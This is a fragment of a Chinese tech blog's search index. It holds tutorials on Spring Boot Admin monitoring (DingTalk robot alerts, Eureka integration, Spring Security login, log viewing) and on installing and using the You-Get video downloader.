"%s\\n\\n";} 实现 Admin 的 Notifier 接口来添加钉钉群机器人的消息通知，若需要监听服务的所有事件变更，还可以改为继承 AbstractEventNotifier 类 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import de.codecentric.boot.admin.server.domain.entities.Instance;import de.codecentric.boot.admin.server.domain.entities.InstanceRepository;import de.codecentric.boot.admin.server.domain.events.InstanceEvent;import de.codecentric.boot.admin.server.domain.events.InstanceStatusChangedEvent;import de.codecentric.boot.admin.server.notify.AbstractStatusChangeNotifier;import org.slf4j.Logger;import org.slf4j.LoggerFactory;import reactor.core.publisher.Mono;public abstract class CustomNotifier extends AbstractStatusChangeNotifier { private Logger logger = LoggerFactory.getLogger(CustomNotifier.class); protected CustomNotifier(InstanceRepository repository) { super(repository); } @Override protected Mono&lt;Void&gt; doNotify(InstanceEvent event, Instance instance) { return Mono.fromRunnable(() -&gt; { if (event instanceof InstanceStatusChangedEvent) { logger.info("Instance {} ({}) is {}", instance.getRegistration().getName(), event.getInstance(), ((InstanceStatusChangedEvent) event).getStatusInfo().getStatus()); String status = ((InstanceStatusChangedEvent) event).getStatusInfo().getStatus(); switch (status) { // 健康检查没通过 case "DOWN": sendMessage(event, instance, "健康检查没通过"); break; // 服务下线 case "OFFLINE": sendMessage(event, instance, "服务下线"); break; // 服务上线 case "UP": sendMessage(event, instance, "服务上线"); break; // 服务未知状态 case "UNKNOWN": sendMessage(event, instance, "服务出现未知状态"); break; default: break; } } else { logger.info("Instance {} ({}) {}", instance.getRegistration().getName(), event.getInstance(), event.getType()); } }); } public abstract void sendMessage(InstanceEvent event, Instance instance, String content);} Admin 的服务状态变更钉钉群机器人通知实现类 12345678910111213141516171819202122232425262728293031323334353637383940414243import cn.hutool.core.date.DatePattern;import cn.hutool.core.date.DateUtil;import com.monitor.notify.message.DingTalkMessageSender;import com.monitor.notify.template.MessageTemplate;import de.codecentric.boot.admin.server.domain.entities.Instance;import de.codecentric.boot.admin.server.domain.entities.InstanceRepository;import de.codecentric.boot.admin.server.domain.events.InstanceEvent;import de.codecentric.boot.admin.server.domain.events.InstanceStatusChangedEvent;import org.springframework.boot.autoconfigure.condition.ConditionalOnExpression;import org.springframework.stereotype.Component;import java.util.Date;@Component@ConditionalOnExpression("${notify.dingtalk.enable:false}")public class DingtalkNotifier extends CustomNotifier { private DingTalkMessageSender messageSender; protected DingtalkNotifier(InstanceRepository repository, DingTalkMessageSender messageSender) { super(repository); this.messageSender = messageSender; } /** * 发送钉钉群机器人消息 * * @param event * @param instance * @param content */ @Override public void sendMessage(InstanceEvent event, Instance instance, String content) { String instanceName = instance.getRegistration().getName(); String instanceId = event.getInstance().toString(); String status = ((InstanceStatusChangedEvent) event).getStatusInfo().getStatus(); String serviceUrl = instance.getRegistration().getServiceUrl(); String dateTime = DateUtil.format(new Date(), DatePattern.NORM_DATETIME_MS_PATTERN); String message = String.format(MessageTemplate.MONITOR_MARKDOWN_TEMPLATE_DINGTALK, instanceName, instanceId, status, content, serviceUrl, dateTime); this.messageSender.sendMarkdownMessage("监控消息", message); }} YML 配置内容123456notify: dingtalk: enable: true access-token: xxxxxxxxxxx sign-secret: SECxxxxxxxxxxx enable-signature: true 钉钉的 Java SDK由于钉钉官方没有将钉钉的 SDK 发布到 Maven 仓库，因此需要在钉钉官网手动下载最新版的 SDK，然后发布到 Maven 私有仓库，或者安装在本地的 Maven 仓库，最后在项目的 pom.xml 配置文件里添加以下依赖。 12345&lt;dependency&gt; &lt;groupId&gt;com.dingtalk&lt;/groupId&gt; &lt;artifactId&gt;dingtalk-api-sdk&lt;/artifactId&gt; &lt;version&gt;1.0.0&lt;/version&gt;&lt;/dependency&gt; 安装钉钉 SDK 到本地 Maven 仓库的命令如下： 1$ mvn install:install-file -Dfile=taobao-sdk-java-auto_1455552377940-20200322.jar -DgroupId=com.dingtalk -DartifactId=dingtalk-api-sdk -Dversion=1.0.0 -Dpackaging=jar 值得一提的是，不同版本的 钉钉 SDK，其 Maven 坐标中的 groupId、artifactId、version 可能会发生变化，此时只需要将上面对应的参数值替换掉即可。 生产环境扩展建议上述给出的是 Spring Boot Admin 集成钉钉群机器人消息通知的 Demo 代码，生产环境下还需要考虑到如下的实际问题： 报警消息重复发送：若 Admin 应用以集群的方式部署，当 A 应用 DOWN 掉后，那么钉钉群成员将会收到多条 A 应用服务状态变更的报警消息 报警消息的持久化：若大量报警消息积压在 Admin 应用里，但还没来得及发送，此时如果 Admin 应用挂掉，那么报警消息将会丢失，建议使用 消息中间件 的持久化特性来解决 报警消息的发送频率：每个钉钉群机器人每分钟最多发送 20 条，如果超过 20 条，会限流 10 分钟；这里建议利用 任务调度线程池 来实现报警消息的调度发送，同时考虑将多条报警消息合并后再发送，以此来解决报警消息发送频率受限制的问题 参考博客 Java 利用钉钉机器人向钉钉群推送消息 Spring Boot Admin 官方集成各类消息通知的源码实现 Spring Boot Admin 2.0.1 集成自定义监控告警 - 钉钉机器人 一个管理异常通知的 Starter，实现了钉钉消息提醒与邮件提醒 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"微服务"},{title:"数据结构与算法之一",url:"/posts/6f42c94c.html",text:'前言 编程四大基础：数据结构与算法、计算机网络、操作系统、设计模式 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"算法与数据结构"},{title:"You-Get 安装使用与介绍",url:"/posts/4d770034.html",text:'前言 You-Get 是一个基于 Python3 的下载工具，可以很轻松地下载到网络上的视频、图片及音乐资源，默认支持 YouTube、哔哩哔哩、优酷、爱奇艺、腾讯视频等视频网站的下载。下面将介绍在 Linux 系统下如何使用 You-Get，此教程适用于 Centos/Debian/Ubuntu 等 Linux 发行版。 依赖说明 以下是必要的依赖，需要提前单独安装，除非是在 Windows 系统下使用预安装包： Python 3.2+ FFmpeg 1.0+ RTMPDump（可选） 通过 PIP 安装 You-Get 的官方版本通过 PyPI 分发，可从 PyPI 镜像中通过 pip 包管理器安装，务必使用 Python3 的 pip。 1$ pip3 install you-get 软件版本升级 1$ pip3 install --upgrade you-get 下载视频 当观赏到感兴趣的视频，可以使用 --info/-i 参数来查看视频的所有可用画质与格式: 123456789101112131415161718192021222324252627282930$ you-get -i \'https://www.youtube.com/watch?v=jNQXAC9IVRw\'site: YouTubetitle: Me at the zoostreams: # Available quality and codecs [ DEFAULT ] _________________________________ - itag: 43 container: webm quality: medium size: 0.5 MiB (564215 bytes) # download-with: you-get --itag=43 [URL] - itag: 18 container: mp4 quality: medium # download-with: you-get --itag=18 [URL] - itag: 5 container: flv quality: small # download-with: you-get --itag=5 [URL] - itag: 36 container: 3gp quality: small # download-with: you-get --itag=36 [URL] - itag: 17 container: 3gp quality: small # download-with: you-get --itag=17 [URL] 标有 DEFAULT 的为默认画质，一般情况下可直接下载，如 YouTube 视频带有字幕，那边字幕将被一同下载，以 SubRip 格式保存： 1234567891011121314$ you-get \'https://www.youtube.com/watch?v=jNQXAC9IVRw\'site: YouTubetitle: Me at the zoostream: - itag: 43 container: webm quality: medium size: 0.5 MiB (564215 bytes) # download-with: you-get --itag=43 [URL]Downloading zoo.webm ...100.0% ( 0.5/0.5 MB) ├████████████████████████████████████████┤[1/1] 7 MB/sSaving Me at the zoo.en.srt ...Done. 注意: 批量下载可以使用参数 --playlist 目前，视频格式选择没有大规模铺开，默认选项为最高画质 ffmpeg 为必要依赖，用于下载流式视频以及合并分块视频 (例如 Youku)，以及 YouTube 的 1080p 或更高分辨率的视频 如果不希望 You-Get 合并视频，可以使用 --no-merge/-n 下载其他内容 直接使用 URL 下载图片，此功能为测试性，远未完成；对于类似 Tumblr 和 Blogger 的大图有效，但是没有办法为所有网站建立通用格式。 12345678$ you-get https://stallman.org/rms.jpgSite: stallman.orgTitle: rmsType: JPEG Image (image/jpeg)Size: 0.06 MiB (66482 Bytes)Downloading rms.jpg ...100.0% ( 0.1/0.1 MB) ├████████████████████████████████████████┤[1/1] 127 kB/s 暂停与恢复下载 可以使用 Ctrl+C 暂停下载，临时的 .download 文件将保存于输出目录。下次使用 You-Get 传入相同参数时，下载将从上次继续开始。如果下载已经完成，临时的 .download 扩展名文件将会被删除，此时 You-Get 将忽略下载。可以用 --force/-f 强行重新下载，会覆盖同名文件或临时文件！ 设置输出路径或文件名 使用 --output-dir/-o 设置路径，--output-filename/-O 设置输出文件名： 1$ you-get -o ~/Videos -O zoo.webm \'https://www.youtube.com/watch?v=jNQXAC9IVRw\' 提示: 此参数可以帮助使用脚本批量下载于指定目录和文件名 如果原视频标题包含有与系统不兼容的字符，此参数十分有效 代理设置 使用 --http-proxy/-x 为 You-Get 设置 HTTP 代理，同时系统代理 (即系统变量 http_proxy) 会自动生效，使用 --no-proxy 则可以强行关闭代理： 1$ you-get -x 127.0.0.1:8087 \'https://www.youtube.com/watch?v=jNQXAC9IVRw\' 提示: 如果经常使用代理 (网络封锁了部分网站)，考虑将 You-Get 和 ProxyChains 一同使用，并在命令行中设置 alias you-get="proxychains -q you-get" 对于某些网站 (例如 Youku)，如果你需要下载仅供中国大陆观看的视频，可以使用 --extractor-proxy/-y 单独为解析器设置代理，也可以使用 -y proxy.uku.im:8888 (鸣谢： Unblock Youku 项目) 播放视频 使用 --player/-p 将视频投喂给播放器，例如 mplayer 或者 vlc，而不是下载视频： 1$ you-get -p vlc \'https://www.youtube.com/watch?v=jNQXAC9IVRw\' 或者想在浏览器中观看而不希望看广告或评论区: 1$ you-get -p chromium \'https://www.youtube.com/watch?v=jNQXAC9IVRw\' 提示：可以使用 -p 开启下载工具，例如 you-get -p uget-gtk \'https://www.youtube.com/watch?v=jNQXAC9IVRw\'，虽然有可能不灵。 加载 Cookie 并非所有视频可供任何人观看，如果需要登录才可以观看 (例如会员视频)，那么可能必须将浏览器的 cookie 通过 --cookies/-c 加载入 You-Get，目前支持两种 cookie 格式：Mozilla cookies.sqlite 和 Netscape cookies.txt。 复用解析数据 使用 --url/-u 获得页面所有可下载 URL 列表，使用 --json 参数则可以获得 JSON 格式的数据，目前此功能未定型，JSON 格式未来有可能变化。 哔哩哔哩批量下载脚本 针对哔哩哔哩的视频，若批量下载参数 --playlist 不适用，可以使用以下 Shell 脚本实现批量下载，传入的参数包括：URL、开始集数、结束集数。如果希望同时执行多个下载任务，那么可以使用不同的参数来多次执行脚本，此操作由于频繁访问哔哩哔哩的视频网站，存在 IP 被封的风险（Http 请求返回 403 错误码）。 12#!/bin/shfor i in $(seq $2 $3); do you-get $1$i; done 或者控制每次执行下载任务之前都等待 N 秒（建议 40 &lt;= N &lt;= 60），防止连续多次下载失败时，频繁访问服务器导致 IP 被封： 12#!/bin/shfor i in $(seq $2 $3); do sleep 40 &amp;&amp; you-get $1$i; done Shell 脚本使用示例： 1sh bilibil.sh https://www.bilibili.com/video/av33087749/?p= 1 3 参考资料 You-Get 官方英文使用说明 You-Get 官方中文使用说明 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux"},{title:"Spring Boot Admin 基础使用教程",url:"/posts/748546b6.html",text:'1、Admin 简介Spring Boot Admin 是一个开源社区项目，用于管理和监控 Spring Boot 应用程序。 应用程序作为 Spring Boot Admin Client 向为 Spring Boot Admin Server 注册（通过 HTTP 协议）或使用 Spring Cloud 注册中心（例如 Eureka、Consul）的服务发现。UI 是的 AngularJs 应用程序，用于展示 Spring Boot Admin Client 的 Actuator 端点上的一些监控数据。Spring Boot Admin 默认提供了如下功能（包括但不限于）： 显示健康状态及详细信息，如 JVM 和内存指标、数据源指标、缓存指标 显示构建信息编号 跟踪并下载日志文件 查看 JVM 系统和环境属性 查看 Spring Boot 配置属性 轻松的日志级别管理 与 JMX-Beans 交互 查看线程转储 查看 Http 跟踪 查看 auditevents 查看 http-endpoints 查看计划任务 查看和删除活动会话（基于 Spring-Session） 查看 Flyway/Liquibase 数据库迁移 下载 heapdump 文件 状态变更通知（支持电子邮件、Slack、Hipchat …） 状态更改的事件日志（非持久性） 特别注意：Spring Boot Admin 默认不支持监控数据的持久化，若对数据的持久化有要求，建议考虑使用 Metrics、CAT、Prometheus + Grafana 等监控平台。 2、Admin 快速入门2.1、版本说明在本文中，使用的 Spring Cloud 版本是 Hoxton.SR1，对应的 Spring Boot 版本是 2.2.2.RELEASE，特别声明除外，点击下载完整的案例代码。 2.2、创建 Maven 父级 Pom 工程在父工程里面配置好工程需要的父级依赖，目的是为了更方便管理与简化配置，具体 Maven 配置如下： 123456789101112131415161718192021222324252627282930&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.2.2.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;!-- 管理依赖 --&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;Hoxton.SR1&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;!--注意：这里需要添加以下配置，否则可能会有各种依赖问题 --&gt;&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;spring-milestones&lt;/id&gt; &lt;name&gt;Spring Milestones&lt;/name&gt; &lt;url&gt;https://repo.spring.io/libs-milestone&lt;/url&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt;&lt;/repositories&gt; 2.3、创建 Admin Server 工程创建 Admin Server 的 Maven 工程，配置工程里的 pom.xml 文件： 123456789&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;de.codecentric&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-admin-starter-server&lt;/artifactId&gt; &lt;version&gt;2.3.0&lt;/version&gt;&lt;/dependency&gt; 添加 Admin Server 需要的 application.yml 配置文件到工程中： 123456server: port: 9001spring: application: name: admin-server 创建 Admin Server 的主启动类，引入 @EnableAdminServer 注解： 12345678@EnableAdminServer@SpringBootApplicationpublic class AdminServerApplication { public static void main(String[] args) { SpringApplication.run(AdminServerApplication.class, args); }} 2.4、创建 Admin Client 工程创建 Admin Client 的 Maven 工程，配置工程里的 pom.xml 文件： 12345678910111213&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;de.codecentric&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-admin-starter-client&lt;/artifactId&gt; &lt;version&gt;2.3.0&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt; 添加 Admin Client 需要的 application.yml 配置文件到工程中，其中 spring.boot.admin.client.url 是 Admin Server 的地址，目的是将 Admin Client 注册到 Admin Server 中，最后暴露 Admin Client 的 Actuator 的所有端口： 123456789101112131415161718192021server: port: 9002spring: application: name: admin-client boot: admin: client: url: http://127.0.0.1:9001 #Spring Boot Admin Server 的地址 instance: prefer-ip: true #将IP注册到Admin Server上，若不配置默认使用机器的主机名，新版本使用的是 "service-host-type: ip"management: endpoints: web: exposure: include: "*" endpoint: health: show-details: ALWAYS 提示 将微服务应用注册到 Admin Server 上时，若希望使用 IP 地址来替代主机名，Spring Admin 的旧版本（例如 2.3.0）可以使用 prefer-ip: true，而在新版本（例如 2.7.9）里使用的是 service-host-type: ip。 创建 Admin Client 的主启动类： 1234567@SpringBootApplicationpublic class AdminClientApplication { public static void main(String[] args) { SpringApplication.run(AdminClientApplication.class, args); }} 2.5、测试结果 1）依次启动 admin-server、admin-client 应用程序 2）浏览器访问 http://127.0.0.1:9001/，打开 Admin Server 的主界面，如下图所示： 3）点击实例信息链接跳转到详细页面，可以查看实例的详细监控信息，如图所示 3、Admin 在线查看日志文件3.1、配置日志文件Spring Boot Admin 提供了基于 Web 页面的方式实时查看业务服务输出的本地日志（如下图），前提是在业务服务中配置了 logging.file，即在被监控的业务模块的 application.yml 配置文件中增加下面的内容： 12logging: file: /tmp/shop/auth.log 特别注意 上述的配置内容只适用于 Spring Admin 旧版本（例如 2.3.0），而在新版本（例如 2.7.9）里需要改用以下配置内容来指定日志文件的路径，否则 Admin 的控制台界面会提示 Fetching logfile failed 的错误信息。 在线查看日志文件之前，必须确保日志文件不是空白文件，否则 Admin 无法正常读取日志文件的内容，此时请求日志文件的 HTTP 响应状态为 416 Requested range not satisfiable。 123456789101112# 暴露监控端点management: endpoints: web: exposure: include: "*" endpoint: health: show-details: ALWAYS logfile: external-file: /tmp/shop/auth.log enabled: true 3.2、源码分析其核心在 LogFileWebEndpointAutoConfiguration 自动配置类上，所以 logging.file.name、logging.file.path、management.endpoint.logfile.external-file 都可以作为开启条件。使用 logging.file.path 配置需要注意，因为默认会读取 spring.log 作为日志文件，而 logging.file.name 则不会。 123456789101112131415161718192021222324252627282930313233343536373839404142434445@Configuration( proxyBeanMethods = false)@ConditionalOnAvailableEndpoint( endpoint = LogFileWebEndpoint.class)@EnableConfigurationProperties({LogFileWebEndpointProperties.class})public class LogFileWebEndpointAutoConfiguration { public LogFileWebEndpointAutoConfiguration() { } @Bean @ConditionalOnMissingBean @Conditional({LogFileWebEndpointAutoConfiguration.LogFileCondition.class}) public LogFileWebEndpoint logFileWebEndpoint(ObjectProvider&lt;LogFile&gt; logFile, LogFileWebEndpointProperties properties) { return new LogFileWebEndpoint((LogFile)logFile.getIfAvailable(), properties.getExternalFile()); } private static class LogFileCondition extends SpringBootCondition { private LogFileCondition() { } public ConditionOutcome getMatchOutcome(ConditionContext context, AnnotatedTypeMetadata metadata) { Environment environment = context.getEnvironment(); String config = this.getLogFileConfig(environment, "logging.file.name", "logging.file"); Builder message = ConditionMessage.forCondition("Log File", new Object[0]); if (StringUtils.hasText(config)) { return ConditionOutcome.match(message.found("logging.file.name").items(new Object[]{config})); } else { config = this.getLogFileConfig(environment, "logging.file.path", "logging.path"); if (StringUtils.hasText(config)) { return ConditionOutcome.match(message.found("logging.file.path").items(new Object[]{config})); } else { config = environment.getProperty("management.endpoint.logfile.external-file"); return StringUtils.hasText(config) ? ConditionOutcome.match(message.found("management.endpoint.logfile.external-file").items(new Object[]{config})) : ConditionOutcome.noMatch(message.didNotFind("logging file").atAll()); } } } private String getLogFileConfig(Environment environment, String configName, String deprecatedConfigName) { String config = environment.resolvePlaceholders("${" + configName + ":}"); return StringUtils.hasText(config) ? config : environment.resolvePlaceholders("${" + deprecatedConfigName + ":}"); } }} 另外可以看到 LogFileWebEndpointProperties 这个类，所以 management.endpoint.logfile.externalFile 也是可以作为开启条件 实际上 Spring 在解析 Properties 时会在 Spring 缓存的 Map 中，把 management.endpoint.logfile.external-file 的 Key 转换成 management.endpoint.logfile.externalFile 4、Admin 整合 Eureka 注册中心在上述的快速入门案例里，是直接将 Admin Client 注册到了 Admin Server 中，而企业开发中更多的是将服务注册到注册中心（Eureka、Consul），以下的案例将演示如何整合 Admin 和 Eureka，点击下载完整的案例代码。 4.1、版本说明在本文中，使用的 Spring Cloud 版本是 Hoxton.SR1，对应的 Spring Boot 版本是 2.2.2.RELEASE，特别声明除外，点击下载完整的案例代码。 4.2、创建 Maven 父级 Pom 工程在父工程里面配置好工程需要的父级依赖，目的是为了更方便管理与简化配置，具体 Maven 配置如下： 123456789101112131415161718192021222324252627282930&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.2.2.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;!-- 管理依赖 --&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;Hoxton.SR1&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;!--注意：这里需要添加以下配置，否则可能会有各种依赖问题 --&gt;&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;spring-milestones&lt;/id&gt; &lt;name&gt;Spring Milestones&lt;/name&gt; &lt;url&gt;https://repo.spring.io/libs-milestone&lt;/url&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt;&lt;/repositories&gt; 4.3、创建 Eureka Server 工程创建 Eureka Server 的 Maven 工程，配置工程里的 pom.xml 文件： 123456&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 创建 Eureka Server 的启动主类： 12345678@SpringBootApplication@EnableEurekaServerpublic class EurekaServerApplication { public static void main(String[] args){ SpringApplication.run(EurekaServerApplication.class, args); }} 添加 Eureka Server 需要的 application.yml 配置文件到工程： 1234567891011server: port: 9003eureka: instance: hostname: localhost #Eureka服务端的实例名称 client: register-with-eureka: false #false表示不向注册中心注册自己 fetch-registry: false #false表示自己就是注册中心，职责就是维护服务实例，并不需要去检索服务 service-url: defaultZone: http://${eureka.instance.hostname}:${server.port}/eureka/ 4.4、创建 Admin Server 工程创建 Admin Server 的 Maven 工程，配置工程里的 pom.xml 文件： 12345678910111213&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;de.codecentric&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-admin-starter-server&lt;/artifactId&gt; &lt;version&gt;2.3.0&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt; 添加 Admin Server 需要的 application.yml 配置文件到工程中，将 Admin Server 注册到 Eureka 注册中心，并暴露 Admin Server 的 Actuator 的所有端口： 1234567891011121314151617181920212223242526server: port: 9001spring: application: name: admin-servereureka: client: registryFetchIntervalSeconds: 5 service-url: defaultZone: http://127.0.0.1:9003/eureka/ instance: leaseRenewalIntervalInSeconds: 10 health-check-url-path: /actuator/health instance-id: ${spring.application.name}-${server.port} #自定义服务名称 prefer-ip-address: true #将IP注册到Eureka Server上，若不配置默认使用机器的主机名management: endpoints: web: exposure: include: "*" endpoint: health: show-details: ALWAYS 创建 Admin Server 的主启动类，添加 @EnableAdminServer 注解开启监控功能，添加 @EnableDiscoveryClient 注解让 Admin Server 可以发现注册到 Eureka 里的其他服务实例： 123456789@EnableAdminServer@EnableDiscoveryClient@SpringBootApplicationpublic class AdminServerApplication { public static void main(String[] args) { SpringApplication.run(AdminServerApplication.class, args); }} 4.5、创建 Admin Client 工程创建 Admin Client 的 Maven 工程，配置工程里的 pom.xml 文件： 1234567891011121314151617&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;de.codecentric&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-admin-starter-client&lt;/artifactId&gt; &lt;version&gt;2.3.0&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt; 添加 Admin Client 需要的 application.yml 配置文件到工程中，将 Admin Client 注册到 Eureka 注册中心，而不是使用上述快速入门案例里的 spring.boot.admin.client.url 将 Admin Client 注册到 Admin Server 中，最后暴露 Admin Client 的 Actuator 的所有端口： 1234567891011121314151617181920212223242526server: port: 9002spring: application: name: admin-clienteureka: client: registryFetchIntervalSeconds: 5 service-url: defaultZone: http://127.0.0.1:9003/eureka/ instance: leaseRenewalIntervalInSeconds: 10 health-check-url-path: /actuator/health instance-id: ${spring.application.name}-${server.port} #自定义服务名称 prefer-ip-address: true #将IP注册到Eureka Server上，若不配置默认使用机器的主机名management: endpoints: web: exposure: include: "*" endpoint: health: show-details: ALWAYS 创建 Admin Client 的主启动类，引入 @EnableDiscoveryClient 注解： 12345678@EnableDiscoveryClient@SpringBootApplicationpublic class AdminClientApplication { public static void main(String[] args) { SpringApplication.run(AdminClientApplication.class, args); }} 4.6、测试结果 1）依次启动 eureka-server、admin-server、admin-client 应用程序 2）浏览器访问 http://127.0.0.1:9001/，打开 Admin Server 的 Web 界面，可以看到有两个服务（如下图所示）： 3）点击实例信息链接跳转到详细页面，可以查看实例的详细监控信息，这里不再累述 5、Admin 整合 Spring Security生产环境中由于考虑到安全问题，一般不允许直接访问 Admin Server 的 Web 界面，建议整合 Admin + Spring Security，为 Admin Server 新增登录界面，点击下载完整的案例代码。 在 Admin Server 工程的 pom.xml 配置文件中引入以下的依赖： 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-security&lt;/artifactId&gt;&lt;/dependency&gt; 在 Admin Server 工程的 application.yml 中配置 Spring Security 的用户名和密码，同时在服务注册时带上 metadata-map 的信息： 123456789101112131415161718192021222324252627282930313233server: port: 9001spring: application: name: admin-server security: user: name: "admin" password: "admin"eureka: client: registryFetchIntervalSeconds: 5 service-url: defaultZone: http://127.0.0.1:9003/eureka/ instance: leaseRenewalIntervalInSeconds: 10 health-check-url-path: /actuator/health instance-id: ${spring.application.name}-${server.port} #自定义服务名称 prefer-ip-address: true #将IP注册到Eureka Server上，若不配置默认使用机器的主机名 metadata-map: #指定Spring Security的用户名和密码 user.name: ${spring.security.user.name} user.password: ${spring.security.user.password}management: endpoints: web: exposure: include: "*" endpoint: health: show-details: ALWAYS 在 Admin Server 工程中创建 Spring Security 的配置类： 12345678910111213141516171819202122232425@Configurationpublic class SecurityConfiguration extends WebSecurityConfigurerAdapter { private final String adminContextPath; public SecurityConfiguration(AdminServerProperties adminServerProperties) { this.adminContextPath = adminServerProperties.getContextPath(); } @Override protected void configure(HttpSecurity http) throws Exception { SavedRequestAwareAuthenticationSuccessHandler successHandler = new SavedRequestAwareAuthenticationSuccessHandler(); successHandler.setTargetUrlParameter("redirectTo"); http.authorizeRequests() .antMatchers(adminContextPath + "/assets/**").permitAll() .antMatchers(adminContextPath + "/login").permitAll() .anyRequest().authenticated() .and() .formLogin().loginPage(adminContextPath + "/login").successHandler(successHandler).and() .logout().logoutUrl(adminContextPath + "/logout").and() .httpBasic().and() .csrf().disable(); }} 重启 Admin Server 服务，在浏览器上访问 http://127.0.0.1:9001/ 后，页面会被重定向到登录界面，登录的用户名和密码分别为上面配置的 admin 和 admin，界面显示如下： 6、Admin 整合邮箱报警Spring Boot Admin 中可以集成邮箱报警功能，比如服务不健康了、下线了，都可以给指定邮箱发送邮件。集成的步骤非常简单，首先在 Admin Server 中引入以下依赖： 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; 